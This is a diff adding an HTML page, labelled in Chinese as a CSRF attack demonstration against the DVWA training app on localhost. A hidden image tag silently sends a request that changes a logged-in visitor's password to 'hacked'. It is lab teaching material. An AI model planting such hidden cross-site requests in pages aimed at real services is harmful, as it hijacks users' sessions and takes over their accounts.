@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF 攻击演示 - 修改密码</title>
+</head>
+<body>
+    <h1>这是一个 CSRF 攻击演示页面</h1>
+    <p>如果你在 DVWA (Low 安全等级) 保持登录状态并打开此页面，你的密码将被修改为 "hacked"。</p>
+    <img src="http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;" alt="">
+</body>
+</html>
